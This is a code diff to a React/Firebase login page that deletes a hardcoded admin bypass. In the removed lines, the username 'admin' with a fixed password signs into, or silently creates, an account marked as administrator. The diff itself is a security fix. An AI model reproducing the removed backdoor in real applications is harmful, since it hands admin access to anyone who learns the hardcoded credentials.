@@ -127,36 +127,8 @@ export default function Login() {
         
         toast.success('Account created successfully!');
       } else {
-        // Special Admin Bypass
-        if (email.toLowerCase() === 'admin' && password === 'admin2000') {
-          const adminEmail = 'dragonballsam86@gmail.com'; 
-          try {
-            await signInWithEmailAndPassword(auth, adminEmail, 'admin2000');
-          } catch (err: any) {
-             // If account doesn't exist, try creating it silently
-             if (err.code === 'auth/user-not-found' || err.code === 'auth/invalid-credential') {
-                try {
-                  const result = await createUserWithEmailAndPassword(auth, adminEmail, 'admin2000');
-                  const user = result.user;
-                  await updateProfile(user, { displayName: 'Administrator' });
-                  // Create the profile doc as admin immediately
-                  await setDoc(doc(db, 'users', user.uid), {
-                    uid: user.uid,
-                    name: 'Administrator',
-                    email: adminEmail,
-                    isAdmin: true,
-                    registeredAt: new Date().toISOString()
-                  });
-                } catch (signUpErr) {
-                  throw new Error('Admin initialization failed. Check internet connection.');
-                }
-             } else {
-               throw err;
-             }
-          }
-        } else {
-          await signInWithEmailAndPassword(auth, email, password);
-        }
+        // Standard email login
+        await signInWithEmailAndPassword(auth, email, password);
         toast.success('Welcome back!');
       }
       navigate('/');
